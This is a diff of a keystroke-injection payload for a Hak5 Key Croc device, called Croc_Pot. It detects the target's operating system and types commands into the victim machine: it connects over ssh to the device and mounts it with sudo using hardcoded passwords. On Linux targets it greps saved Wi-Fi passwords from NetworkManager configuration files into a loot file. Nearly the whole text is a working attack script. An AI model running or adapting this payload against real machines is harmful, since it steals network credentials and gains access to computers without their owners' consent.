@@ -1,12 +1,15 @@
 # Title:         Croc_Pot Payload
-# Description:   Start Croc_pot
+# Description:   Start Croc_pot bash script
 # Author:        Spywill
-# Version:       1.8
+# Version:       1.0.1
 # Category:      Key Croc
 #
 #
 MATCH crocpot
-CROC_PW=ADD PASSWD HERE
+#
+CROC_PW=hak5croc      #<-----Edit KEYCROC_PASSWD_HERE
+PC_PW=LINUX           #<-----Edit LINUX-PC_PASSWD_HERE
+#
 CROC_OS=/root/udisk/loot/Croc_OS.txt
 cat > ${CROC_OS}
 rm -f /root/udisk/loot/Croc_OS_wind.txt /root/udisk/loot/Croc_OS_ip.txt
@@ -46,14 +49,14 @@ case $TARGET_OS in
            Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
            Q ENTER
            sleep 2
-           Q STRING "${CROC_PW}"  #<--Edit KEYCROC_PASSWD_HERE
+           Q STRING "${CROC_PW}"
            Q ENTER
            sleep 2
            echo "$TARGET_OS" >> ${CROC_OS}
            echo "$TARGET_IP" >> ${CROC_OS}
            echo "$TARGET_HOSTNAME" >> ${CROC_OS}
            echo "$HOST_IP" >> ${CROC_OS}
-           Q STRING "/root/udisk/tools/Croc_Pot-8.sh"
+           Q STRING "/root/udisk/tools/Croc_Pot.sh"
            Q ENTER;;
       MACOS)
            ATTACKMODE HID
@@ -67,14 +70,14 @@ case $TARGET_OS in
            Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
            Q ENTER
            sleep 2
-           Q STRING "${CROC_PW}"  #<--Edit KEYCROC_PASSWD_HERE
+           Q STRING "${CROC_PW}"
            Q ENTER
            sleep 1
            echo "$TARGET_OS" >> ${CROC_OS}
            echo "$TARGET_IP" >> ${CROC_OS}
            echo "$TARGET_HOSTNAME" >> ${CROC_OS}
            echo "$HOST_IP" >> ${CROC_OS}
-           Q STRING "/root/udisk/tools/Croc_Pot-8.sh"
+           Q STRING "/root/udisk/tools/Croc_Pot.sh"
            Q ENTER;;
       LINUX)
            ATTACKMODE HID STORAGE
@@ -113,7 +116,7 @@ raspberrypi)
            echo "$TARGET_IP" | tee -a ${CROC_OS}
            echo "$TARGET_HOSTNAME" | tee -a ${CROC_OS}
            echo "$HOST_IP" | tee -a ${CROC_OS}
-           Q STRING "/root/udisk/tools/Croc_Pot-8.sh"
+           Q STRING "/root/udisk/tools/Croc_Pot.sh"
            Q ENTER;;
      parrot)
            Q ALT F2
@@ -123,7 +126,7 @@ raspberrypi)
            sleep 1
            Q STRING "sudo mkdir /media/\$(whoami)/KeyCroc/"
            Q ENTER
-           Q STRING "${CROC_PW}"
+           Q STRING "${PC_PW}"
            Q ENTER
            sleep 1
            Q STRING "sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0"
@@ -146,9 +149,6 @@ raspberrypi)
            Q STRING "ip -o link | awk '\$2 != \"lo:\" {print \$2, \$(NF-2)}' | tee -a \${PC_USER}"
            Q ENTER
            sleep 1
-#           Q STRING "sudo cp /root/.ssh/id_rsa.pub /media/\$(whoami)/KeyCroc/loot"
-#           Q ENTER
-#           sleep 1
            Q STRING "sudo umount /media/\$(whoami)/KeyCroc/"
            Q ENTER
            sleep 1
@@ -165,9 +165,7 @@ raspberrypi)
            echo "$TARGET_IP" | tee -a ${CROC_OS}
            echo "$TARGET_HOSTNAME" | tee -a ${CROC_OS}
            echo "$HOST_IP" | tee -a ${CROC_OS}
-#           cp /root/udisk/loot/id_rsa.pub /root/.ssh
-#           rm /root/udisk/loot/id_rsa.pub
-           Q STRING "/root/udisk/tools/Croc_Pot-8.sh"
+           Q STRING "/root/udisk/tools/Croc_Pot.sh"
            Q ENTER;;
           *)
            Q ALT F2
@@ -177,7 +175,7 @@ raspberrypi)
            sleep 1
            Q STRING "sudo mkdir /media/\$(whoami)/KeyCroc/"
            Q ENTER
-           Q STRING "${CROC_PW}"
+           Q STRING "${PC_PW}"
            Q ENTER
            sleep 1
            Q STRING "sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0"
@@ -194,7 +192,10 @@ raspberrypi)
            Q STRING "ip -4 -o addr show wlan0 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER}" 
            Q ENTER
            sleep 1
-           Q STRING "sudo grep -r '^psk=' /etc/NetworkManager/system-connections/ | tee -a \${PC_USER}"
+           Q STRING "sudo grep -r '^psk=' /etc/NetworkManager/system-connections/ | sed -E -e 's/[/]//g' -e 's/etc//g' -e 's/NetworkManagersystem-connections//g' -e 's/.nmconnection:psk//g' | tee -a \${PC_USER}"
+           Q ENTER
+           sleep 1
+           Q STRING "ip -o link | awk '\$2 != \"lo:\" {print \$2, \$(NF-2)}' | tee -a \${PC_USER}"
            Q ENTER
            sleep 1
            Q STRING "sudo umount /media/\$(whoami)/KeyCroc/"
@@ -213,7 +214,7 @@ raspberrypi)
            echo "$TARGET_IP" | tee -a ${CROC_OS}
            echo "$TARGET_HOSTNAME" | tee -a ${CROC_OS}
            echo "$HOST_IP" | tee -a ${CROC_OS}
-           Q STRING "/root/udisk/tools/Croc_Pot-8.sh"
+           Q STRING "/root/udisk/tools/Croc_Pot.sh"
            Q ENTER;;
       esac
     ;;
